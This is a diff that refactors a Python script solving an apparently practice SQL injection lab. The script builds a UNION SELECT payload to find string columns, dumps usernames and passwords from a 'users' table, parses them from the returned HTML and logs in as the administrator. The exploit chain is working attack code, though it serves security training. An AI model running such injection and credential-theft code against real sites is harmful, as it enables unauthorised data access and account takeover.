@@ -1,27 +1,25 @@
 #!/usr/bin/env python3
 """SQL injection UNION attack, retrieving data from other tables"""
 
-from typing import List, NamedTuple
+from typing import NamedTuple
 
 import bs4
 import requests
 
 import lab_04
 
+
 class Lab(lab_04.Lab):
     """Wrapper"""
 
     User = NamedTuple("User", [("name", str), ("password", str)])
 
-    def columns_of_string_type(self, table: str = "") -> List[int]:
+    def columns_of_string_type(self, table: str = "") -> list[int]:
         """Get which columns are string types"""
-        string_type_indices = []
-        for i in range(self.column_count(table=table)):
-            if self.column_is_string_type(i, table=table):
-                string_type_indices.append(i)
-        return string_type_indices
+        return [i for i in range(self.column_count(table=table))
+                if self.column_is_string_type(i, table=table)]
 
-    def dump_table(self, fields: List[str], table: str = "",
+    def dump_table(self, fields: list[str], table: str = "",
                    where: str = "") -> requests.models.Response:
         """Get usernames and passwords"""
         fields_str = ",+".join(fields)
@@ -30,25 +28,22 @@ class Lab(lab_04.Lab):
         if where:
             where = f"+WHERE+{where}"
         payload = {self.key: f"'+UNION+SELECT+{fields_str}" \
-                             + f"{table}{where}{self.comment}"}
+                             f"{table}{where}{self.comment}"}
         payload_str = self._dict_to_str(payload)
         response = self.session.get(self.url + self.path, params=payload_str)
         response.raise_for_status()
         return response
 
     @staticmethod
-    def parse_html_user_table(response_text: str) -> List["Lab.User"]:
+    def parse_html_user_table(response_text: str) -> list["Lab.User"]:
         """Parse usernames and passwords from HTML"""
-        username_pw = []
         soup = bs4.BeautifulSoup(response_text, features="lxml")
         table = soup.find("table", attrs={"class": "is-table-longdescription"})
         rows = table.tbody.find_all("tr")
-        for row in rows:
-            username_pw.append(Lab.User(name=row.th.text, password=row.td.text))
-        return username_pw
+        return [Lab.User(name=row.th.text, password=row.td.text) for row in rows]
 
     def login(self, username: str, password: str,
-              csrf: str = None) -> requests.models.Response:
+              csrf: str | None = None) -> requests.models.Response:
         """Log in"""
         payload = {"username": username, "password": password}
         if csrf is not None:
@@ -57,6 +52,7 @@ class Lab(lab_04.Lab):
         response.raise_for_status()
         return response
 
+
 def main() -> None:
     """Entry point"""
     site = Lab(key="category", path="/filter")
@@ -64,11 +60,12 @@ def main() -> None:
         raise RuntimeError(f"Expected [0, 1]; got {site.columns_of_string_type()}")
     response = site.dump_table(["username", "password"], "users")
     users = site.parse_html_user_table(response.text)
-    admin = [user for user in users if user.name == "administrator"][0]
+    admin = next(user for user in users if user.name == "administrator")
     csrf = site.csrf_token("/login")
     response = site.login(admin.name, admin.password, csrf=csrf)
     response.raise_for_status()
     print(response.status_code)
+
 
 if __name__ == "__main__":
     main()
